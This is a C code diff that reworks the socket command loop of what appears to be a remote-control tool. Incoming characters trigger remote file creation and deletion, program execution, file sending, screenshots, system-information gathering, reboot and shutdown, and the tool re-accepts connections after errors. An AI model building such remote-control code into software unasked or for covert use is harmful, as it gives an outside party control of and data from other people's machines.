@@ -6,38 +6,59 @@ void Menu(struct Data *data)
 		if (recv(data->Server, data->Massage, 200, 0) != SOCKET_ERROR)
 		{
 			printf("%s\n", data->Massage);
-			//Menu = atoi(data->Massage[0]);
-			switch (data->Massage[0])
-			{
-			case '1':
-				RebootPC();
-				break;
-			case '2':
-				ShutDownPC();
-				break;
-			case '3':
-				ExitSystemePC();
-				break;
-			case '4':
-				OpenCD_ROM();
-				break;
-			case '5':
-				ExitFunction();
-				break;
-			case '8':
-				CreatFile(data->Massage,data);
-				break;
-			case '7':
-				DelFile(data->Massage,data);
-			case '6':
+			if (data->Massage[0] == '1') {
+				CreatFile(data->Massage, data);
+			}
+			else if (data->Massage[0] == '2') {
+				DelFile(data->Massage, data);
+			}
+			else if (data->Massage[0] == '3') {
+				Execute(data->Massage);
+			}
+			else if (data->Massage[0] == '4') {
+				CloseProgramm(data->Massage);
+			}
+			else if (data->Massage[0] == '5') {
+				sendFileFunction(data->Massage, data);
+			}
+			else if (data->Massage[0] == '6') {
 				WorkWithCursor(data);
-			case '0':
-				sendFileFunction(data->Massage,data);
+			}
+			else if (data->Massage[0] == '7') {
+				sendInformationSysteme(data);
+			}
+			else if (data->Massage[0] == '8') {
+				GetInfoAboutWindows(data);
+			}
+			else if (data->Massage[0] == '9') {
+				RebootPC();
+			}
+			else if (data->Massage[0] == 'a') {
+				ShutDownPC();
+			}
+			else if (data->Massage[0] == 'b') {
+				ExitSystemePC();
+			}
+			else if (data->Massage[0] == 'c') {
+				OpenCD_ROM();
+			}
+			else if (data->Massage[0] == 'd') {
+				ShowFiles(data);
+			}
+			else if (data->Massage[0] == 'e') {
+				CPY(data->Massage);
+			}
+			else if(data->Massage[0] == 'f') {
+				MkScreen(data->Massage, data);
 			}
 		}
 		else {
 			printf("Error of getting! \n");
-			break;
+			listen(data->Sock, SOMAXCONN);
+			data->Server = accept(data->Sock, (SOCKADDR*)&(data->sin), 0);
+			recv(data->Server, data->ServerName, 30, 0);
+			send(data->Server, data->PCName, strlen(data->PCName) + 1, 0);
+			continue;
 		}
 	}
 }
